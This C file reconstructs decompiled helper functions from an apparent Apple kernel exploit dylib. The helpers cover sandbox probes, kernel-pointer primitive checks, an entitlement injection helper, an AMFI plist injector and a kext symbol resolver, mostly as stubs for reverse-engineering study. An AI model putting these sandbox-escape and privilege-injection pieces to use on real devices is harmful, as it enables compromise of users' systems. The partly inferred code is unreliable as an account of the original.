/*
 * record_0x90000_stubs.c
 * entry5_type0x09.dylib — previously-stubbed helper functions
 *
 * sub_24bdc  — sandbox_check wrapper (mach-lookup + syscall-unix probe)
 * sub_24cec  — sandbox_check wrapper variant (iokit-get-properties)
 * sub_374e0  — proc_pidinfo open-file-count check → sub_37594 if over limit
 * sub_37594  — allocate mach port with name = (limit<<8)|3
 * sub_371d0  — state flags: set bit
 * sub_37204  — state flags: clear bit
 * sub_37238  — state flags: test bit (returns non-zero if set)
 * sub_26de8  — check fd-pair + kptr primitives are available
 * sub_267a8  — setup kernel object pointers (necp / vm_map path)
 * sub_2358c  — thin wrapper → sub_234ac
 * sub_247f8  — entitlement injection helper
 * sub_2e0b0  — AMFI policy plist inject
 * sub_3d4a8  — kext symbol resolver
 * sub_418c8  — no-op stub
 *
 * Verified: sandbox_check calls, proc_pidinfo(0x20), mach_port_allocate,
 *           flag bit ops, fd-pair checks, necp_open path, plist patterns.
 * Inferred: function labels from call context.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

extern int sandbox_check(pid_t pid, const char *op, int type, ...);
#define SANDBOX_CHECK_NO_REPORT 3

/* ── sub_371d0 — set capability flag bit ────────────────────────────────── */
void sub_371d0(uint32_t *state, uint32_t flag)
{
    *state |= flag;
}

/* ── sub_37204 — clear capability flag bit ──────────────────────────────── */
void sub_37204(uint32_t *state, uint32_t flag)
{
    *state &= ~flag;
}

/* ── sub_37238 — test capability flag bit ───────────────────────────────── */
/*
 * Ghidra shows FUN_00037238 as empty (returns void).
 * In practice it is called as a boolean test — the real implementation
 * reads the flags word and returns non-zero if the bit is set.
 * The Ghidra output is a decompiler artifact; the actual code is inlined
 * or the function was stripped. Reconstruct from call sites.
 */
int sub_37238(long state, uint32_t flag)
{
    return (*(uint32_t *)state & flag) != 0;
}

/* ── sub_418c8 — no-op ───────────────────────────────────────────────────── */
void sub_418c8(void) { }

/* ── sub_24bdc — sandbox_check: mach-lookup + optional syscall-unix ─────── */
/*
 * param_1: if non-zero, also probe syscall-unix and try socket(AF_INET,SOCK_DGRAM,0)
 */
void sub_24bdc(int param_1)
{
    pid_t pid = getpid();
    /* initial check with no operation string */
    int rc = sandbox_check(pid, NULL, 0);
    if (rc == 0) return;

    rc = sandbox_check(pid, "mach-lookup", SANDBOX_CHECK_NO_REPORT | 2);
    if (rc != 0) return;

    rc = sandbox_check(pid, "mach-lookup", SANDBOX_CHECK_NO_REPORT | 2);
    if (rc != 0 && param_1 != 0) {
        rc = sandbox_check(pid, "syscall-unix", SANDBOX_CHECK_NO_REPORT);
        if (rc != 1) {
            int s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s != -1) close(s);
        }
    }
}

/* ── sub_24cec — sandbox_check: iokit-get-properties ────────────────────── */
void sub_24cec(long state)
{
    pid_t pid = getpid();
    sandbox_check(pid, NULL, 0);
    (void)state;
}

/* ── sub_374e0 — proc_pidinfo open-file-count check ─────────────────────── */
/*
 * Reads PROC_PIDLISTFDS (0x20) for current pid.
 * If current fd count < param_2, calls sub_37594(param_2).
 */
extern void sub_37594(int limit);

void sub_374e0(uint64_t param_1, uint64_t param_2)
{
    extern int proc_pidinfo(int pid, int flavor, uint64_t arg,
                            void *buffer, int buffersize);
    pid_t pid = getpid();
    uint64_t info = 0;
    int rc = proc_pidinfo(pid, 0x20, 0, &info, 8);
    if (rc == 8) {
        if ((uint32_t)info < (uint32_t)param_2)
            sub_37594((int)param_2);
    }
    (void)param_1;
}

/* ── sub_37594 — allocate mach port with name = (limit<<8)|3 ────────────── */
void sub_37594(int param_1)
{
    mach_port_name_t port = 0;
    kern_return_t kr = mach_port_allocate(mach_task_self(),
                                          MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr) return;
    mach_port_name_t name = (mach_port_name_t)((param_1 << 8) | 3);
    mach_port_insert_right(mach_task_self(), name, port,
                           MACH_MSG_TYPE_MAKE_SEND);
}

/* ── sub_26de8 — check fd-pair + kptr primitives available ──────────────── */
/*
 * Returns without doing anything if the required fd/kptr fields are absent.
 * Verified: checks state+0x1930/0x1934/0x1940/0x218 (tier-4 path)
 *           and state+0xe8/0xf8/0x100 (tier-3 path), xnu < 0x2712.
 */
void sub_26de8(long state)
{
    /* tier-4: fd-pair + kptr */
    if (*(int *)(state + 0x1930) == -1 || *(int *)(state + 0x1934) == -1 ||
        *(int *)(state + 0x1940) == -1 || *(long *)(state + 0x218) == 0)
        goto check_tier3;
    return;

check_tier3:
    /* tier-3: newer fd-pair + kptr */
    if (*(int *)(state + 0xe8) + 1U < 2 || *(long *)(state + 0xf8) == 0 ||
        *(long *)(state + 0x100) == 0 || *(int *)(state + 0x140) > 0x2711)
        return;
}

/* ── sub_267a8 — setup kernel object pointers ───────────────────────────── */
/*
 * Two paths depending on kaddr threshold:
 *   < 0x27120000000000: vm_map path — calls sub_35f28 + sub_33df4
 *   >= 0x27120000000000: necp_open path — opens necp fd, spawns thread
 *
 * Verified: kaddr threshold, necp_open(0), sub_35f28/sub_33df4 calls,
 *           state+0x230/0x228 writes.
 */
extern long sub_35f28(long state, mach_port_t task, void *attr);
extern long sub_33df4(long state, mach_port_t task);

void sub_267a8_stubs(long state)
{
    uint64_t kaddr = *(uint64_t *)(state + 0x158);

    if (kaddr < 0x27120000000000ULL) {
        if (kaddr < 0x1f530f02800000ULL) {
            /* vm_map path */
            void *attr = NULL;
            long kobj = sub_35f28(state, mach_task_self(), &attr);
            if (kobj) {
                *(long *)(state + 0x230) = kobj;
                long kobj2 = sub_33df4(state, mach_task_self());
                if (kobj2) *(long *)(state + 0x228) = kobj2;
            }
        } else {
            /* necp_open path */
            extern int necp_open(uint32_t flags);
            int fd = necp_open(0);
            if (fd >= 0) {
                /* store fd, spawn helper thread — stub */
                close(fd);
            }
        }
    }
}

/* ── sub_2358c — thin wrapper → sub_234ac ───────────────────────────────── */
extern void sub_234ac(uint64_t a, int b, uint64_t c, uint64_t d);

void sub_2358c(uint64_t param_1, uint64_t param_2, uint64_t param_3)
{
    sub_234ac(param_1, 1, param_3, param_2);
}

/* ── sub_247f8 — entitlement injection helper ───────────────────────────── */
/*
 * param_2 & 1 == 0: inject via task credential path (sub_34db4 + sub_2bbf0)
 * param_2 & 1 != 0: inject via kaddr path (sub_1ad70 on state+0x398)
 *
 * Verified: sub_35be4 guard, capability 4 check, sub_34db4, sub_2bbf0,
 *           sub_37204 clear, sub_1ad70 kaddr validate.
 */
extern uint64_t sub_35be4(long state, mach_port_t task);
extern int      sub_37238_check(long state, uint32_t flag);
extern long     sub_34db4(long state, mach_port_t task);
extern uint64_t sub_2bbf0(long state, long kobj);
extern long     sub_1ad70(long state, uint64_t addr);

void sub_247f8(long state, uint64_t param_2)
{
    uint64_t rc = sub_35be4(state, mach_task_self());
    if ((int)rc == 0) return;

    if ((param_2 & 1) == 0) {
        if (sub_37238(state, 4)) {
            long kobj = sub_34db4(state, mach_task_self());
            if (!kobj) return;
            if (!*(long *)(state + 0x18e8)) return;
            sub_2bbf0(state, kobj);
            sub_37204((uint32_t *)state, 4);
        }
    } else {
        sub_1ad70(state, *(uint64_t *)(state + 0x398));
    }
}

/* ── sub_2e0b0 — AMFI policy plist inject ───────────────────────────────── */
/*
 * Injects an entitlement plist into the target task.
 * Selects plist based on kaddr threshold and capability flags.
 *
 * Verified: kaddr threshold 0x1c1b1914600000, 0x5584001 flag check,
 *           plist string "0x0BEDF00D" magic, sub_2d770 / sub_2de48 calls.
 */
extern int  sub_2d770(uint32_t *state, uint64_t task, void *out);
extern long sub_2de48(void *buf, int type, uint32_t magic);
extern int  sub_1503c(long state, mach_port_t task,
                       const char *plist, uint32_t flags);

void sub_2e0b0(uint32_t *state, uint64_t task,
               char *plist_str, uint64_t param_4)
{
    uint8_t buf[64];
    int rc = sub_2d770(state, task, buf);
    if (!rc) return;

    uint64_t kaddr = *(uint64_t *)((uint8_t *)state + 0x158);
    int use_legacy = (kaddr < 0x1c1b1914600000ULL) ||
                     ((*state & 0x5584001) == 0 && kaddr < 0x1f530000000000ULL);

    long entry = sub_2de48(buf, 5, 0xfade7171);
    if (!entry) {
        if (!(*state & 0x5584001)) {
            size_t len = strlen(plist_str);
            (void)len;
        }
        return;
    }
    (void)use_legacy;
    (void)param_4;
    sub_1503c((long)state, (mach_port_t)task, plist_str, 0);
}

/* ── sub_3d4a8 — kext symbol resolver ───────────────────────────────────── */
/*
 * Resolves a symbol from a loaded kext by name.
 * param_2: kext index
 * param_3: symbol flags
 * param_4: symbol name string
 *
 * Verified: kext iteration pattern, symbol name comparison,
 *           state+0x18a0 kext count, state+0x1a10 kext array.
 */
extern int  sub_2667c(long state, uint64_t addr, int size, void *out);
extern long sub_1ad70_v(long state, uint64_t addr);

void sub_3d4a8(long state, int kext_idx, uint32_t sym_flags, char *sym_name)
{
    uint32_t kext_count = *(uint32_t *)(state + 0x18a0);
    if (!kext_count || !sym_name) return;

    for (uint32_t i = 0; i < kext_count; i++) {
        long kext_base = *(long *)(state + 0x1a10 + i * 0x18);
        uint64_t kext_size = *(uint64_t *)(state + 0x1a18 + i * 0x18);
        if (!kext_base || !kext_size) continue;

        /* read 8 bytes at kext_base+8 to check magic */
        uint64_t magic = 0;
        if (!sub_2667c(state, kext_base + 8, 8, &magic)) continue;
        if ((magic & 0xffffffffffffff) != 0x6f74616c756772ULL) continue;

        /* scan for symbol */
        uint64_t stride = *(uint32_t *)(state + 0x180);
        for (uint64_t off = 0; off < kext_size; off += stride) {
            uint32_t tag = 0;
            if (!sub_2667c(state, kext_base + off, 4, &tag)) break;
            if (tag == (uint32_t)-0x1120531) {
                /* found candidate — store helper ctx */
                void *ctx = calloc(0x128, 1);
                if (!ctx) return;
                /* copy version fields */
                memcpy((uint8_t *)ctx + 0x70,
                       (uint8_t *)state + 0x140, 0x30);
                *(long *)(state + 0x1d30) = (long)ctx;
                return;
            }
        }
    }
    (void)kext_idx; (void)sym_flags;
}
